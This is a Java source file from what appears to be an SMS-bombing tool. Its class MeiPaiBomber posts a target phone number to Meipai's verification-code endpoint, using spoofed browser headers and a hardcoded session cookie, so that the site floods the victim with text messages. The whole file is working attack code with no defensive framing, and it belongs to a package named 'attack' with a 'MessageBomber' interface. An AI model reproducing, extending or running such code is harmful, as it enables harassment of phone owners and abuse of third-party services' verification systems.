package com.utils.attack;

import org.apache.http.HttpEntity;
import org.apache.http.HttpStatus;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.message.BasicHeader;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.List;

/**
 * Created by fz on 2015/8/23.
 */
public class MeiPaiBomber implements MessageBomber{

    public String name;

    public MeiPaiBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception {

        HttpPost httpPost = new HttpPost("http://www.meipai.com/users/send_verify_code_to_phone");

        List<NameValuePair> pairs = new ArrayList<NameValuePair>();
        pairs.add(new BasicNameValuePair("phone", fuckNo));
        pairs.add(new BasicNameValuePair("phone_flag", "86"));
        pairs.add(new BasicNameValuePair("type", "register"));

        UrlEncodedFormEntity uefEntity = new UrlEncodedFormEntity(pairs, "utf-8");

        httpPost.setHeader(new BasicHeader("Accept", "text/plain, */*; q=0.01"));
        httpPost.setHeader(new BasicHeader("Accept-Encoding", "gzip, deflate"));
        httpPost.setHeader(new BasicHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2"));
        httpPost.setHeader(new BasicHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"));
        httpPost.setHeader(new BasicHeader("DNT", "1"));
        httpPost.setHeader(new BasicHeader("Host", "www.meipai.com"));
        httpPost.setHeader(new BasicHeader("Origin", "http://www.meipai.com"));
        httpPost.setHeader(new BasicHeader("Referer", "http://www.meipai.com/"));
        httpPost.setHeader(new BasicHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"));
        httpPost.setHeader(new BasicHeader("X-Requested-With", "XMLHttpRequest"));
        httpPost.setHeader(new BasicHeader("Cookie", "MUSID=ocv09e4k421c3aoqr9ud4uh902; spread_f=a%3A2%3A%7Bs%3A4%3A%22from%22%3Bs%3A10%3A%22ref%3Ahao123%22%3Bs%3A9%3A%22timestamp%22%3Bi%3A1440339704%3B%7D; CNZZDATA1254838410=454878110-1440336030-http%253A%252F%252Fwww.hao123.com%252F%7C1440336030; sid=ocv09e4k421c3aoqr9ud4uh902; Hm_lvt_027deb58f2792dc5d4f5eae213f83aac=1440339725; Hm_lpvt_027deb58f2792dc5d4f5eae213f83aac=1440339725; ZDEDebuggerPresent=php,phtml,php3"));

        httpPost.setEntity(uefEntity);

        CloseableHttpResponse httpResponse = httpClient.execute(httpPost);
        String result = null;
        try{
            HttpEntity entity = httpResponse.getEntity();
            if(httpResponse.getStatusLine().getStatusCode() == HttpStatus.SC_OK){
                if (entity != null){
                    result = EntityUtils.toString(entity, "utf-8");
                }
                EntityUtils.consume(entity);
            }
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            httpResponse.close();
        }
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
